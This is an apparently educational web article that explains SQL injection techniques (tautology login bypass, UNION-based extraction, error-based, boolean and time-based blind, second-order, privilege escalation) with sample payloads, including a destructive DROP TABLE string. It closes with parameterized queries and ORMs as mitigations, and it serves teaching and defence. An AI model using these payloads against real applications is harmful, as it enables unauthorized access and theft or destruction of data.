<p>SQL injection is a common and serious security vulnerability that allows attackers to interfere with the queries an application makes to its database. Here are some practical examples and explanations of SQL injection logic:</p><h4><strong>1. Basic SQL Injection</strong></h4><h4><strong>Example 1: Simple Injection</strong></h4><p><strong>Scenario:</strong> An application uses the following SQL query to authenticate users:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE username = 'user' AND password = 'pass';
</pre><p><strong>Injection:</strong> If an attacker inputs the following in the username field:</p><pre class="prettyprint linenums">' OR '1'='1
</pre><p>The query becomes:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'pass';
</pre><p><strong>Result:</strong> This query always returns true (<code>'1'='1'</code>), potentially allowing unauthorized access.</p><p><br></p><h4><strong>2. Union-Based SQL Injection</strong></h4><h4><strong>Example 2: Extracting Data</strong></h4><p><strong>Scenario:</strong> An application displays user profile information using the following query:</p><pre class="prettyprint linenums">SELECT name, email FROM users WHERE user_id = 1;
</pre><p><strong>Injection:</strong> If an attacker inputs the following in the <code>user_id</code> field:</p><pre class="prettyprint linenums">1 UNION SELECT username, password FROM admins
</pre><p>The query becomes:</p><pre class="prettyprint linenums">SELECT name, email FROM users WHERE user_id = 1 UNION SELECT username, password FROM admins;
</pre><p><strong>Result:</strong> This query combines results from both the <code>users</code> and <code>admins</code> tables, potentially exposing sensitive data.</p><p><br></p><h4><strong>3. Error-Based SQL Injection</strong></h4><h4><strong>Example 3: Triggering Error Messages</strong></h4><p><strong>Scenario:</strong> An application fetches user information with a query like:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE user_id = 1;
</pre><p><strong>Injection:</strong> If an attacker inputs the following in the <code>user_id</code> field:</p><pre class="prettyprint linenums">1' OR 1=CONVERT(int, (SELECT @@version)) --
</pre><p>The query becomes:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE user_id = 1' OR 1=CONVERT(int, (SELECT @@version)) --;
</pre><p><strong>Result:</strong> This may trigger an error message that reveals the SQL version, which can be useful for further attacks.</p><p><br></p><h4><strong>4. Blind SQL Injection</strong></h4><h4><strong>Example 4: Boolean-Based Blind Injection</strong></h4><p><strong>Scenario:</strong> An application checks if a user exists with the following query:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE username = 'input';
</pre><p><strong>Injection:</strong> If an attacker inputs:</p><pre class="prettyprint linenums">' AND 1=1 --
</pre><p>The query becomes:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE username = '' AND 1=1 --;
</pre><p><strong>Result:</strong> If the application behaves differently for valid versus invalid inputs, the attacker can infer whether the condition is true or false based on the application's response.</p><p><br></p><h4><strong>5. Time-Based Blind SQL Injection</strong></h4><h4><strong>Example 5: Timing Attacks</strong></h4><p><strong>Scenario:</strong> An application checks for user existence with:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE username = 'input';
</pre><p><strong>Injection:</strong> If an attacker inputs:</p><pre class="prettyprint linenums">' OR IF(1=1, SLEEP(5), 0) --
</pre><p>The query becomes:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE username = '' OR IF(1=1, SLEEP(5), 0) --;
</pre><p><strong>Result:</strong> The query introduces a delay if the condition is true, allowing the attacker to infer information based on response time.</p><p><br></p><h4><strong>6. Second-Order SQL Injection</strong></h4><h4><strong>Example 6: Delayed Execution</strong></h4><p><strong>Scenario:</strong> An application saves user input and later uses it in a query:</p><pre class="prettyprint linenums">INSERT INTO comments (content) VALUES ('input');
</pre><p><strong>Injection:</strong> If an attacker inputs:</p><pre class="prettyprint linenums">'); DROP TABLE users; --
</pre><p>This injection may not immediately cause harm but could be executed later when the data is used in a query.</p><p><br></p><h4><strong>7. Authentication Bypass</strong></h4><h4><strong>Example 7: Bypassing Login</strong></h4><p><strong>Scenario:</strong> A login form uses:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE username = 'user' AND password = 'pass';
</pre><p><strong>Injection:</strong> If an attacker inputs:</p><pre class="prettyprint linenums">' OR '1'='1
</pre><p><strong>Result:</strong> This bypasses authentication by always evaluating to true.</p><p><br></p><h4><strong>8. Privilege Escalation</strong></h4><h4><strong>Example 8: Gaining Admin Access</strong></h4><p><strong>Scenario:</strong> An application checks user roles with:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE user_id = 'input';
</pre><p><strong>Injection:</strong> If an attacker inputs:</p><pre class="prettyprint linenums">1 UNION SELECT username, password FROM admins --
</pre><p><strong>Result:</strong> The attacker can extract admin credentials and escalate privileges.</p><p><br></p><h4><strong>9. Parameterized Queries as Mitigation</strong></h4><h4><strong>Example 9: Secure Query</strong></h4><p><strong>Scenario:</strong> Use parameterized queries to prevent SQL injection:</p><pre class="prettyprint linenums">SELECT * FROM users WHERE username = ? AND password = ?;
</pre><p><strong>Implementation:</strong> Use placeholders (<code>?</code>) and bind parameters in application code to prevent injection.</p><p><br></p><h4><strong>10. Using ORM (Object-Relational Mapping)</strong></h4><h4><strong>Example 10: ORM Query</strong></h4><p><strong>Scenario:</strong> Using an ORM framework to interact with the database can help prevent SQL injection:</p><pre class="prettyprint linenums">user = session.query(User).filter_by(username=username).first()
</pre><p><strong>Implementation:</strong> ORMs automatically handle parameterized queries and help mitigate injection risks.</p><p>These examples illustrate different SQL injection techniques and how they can be used to exploit vulnerabilities. To prevent SQL injection, always use parameterized queries, prepared statements, and secure coding practices.</p><p><br></p>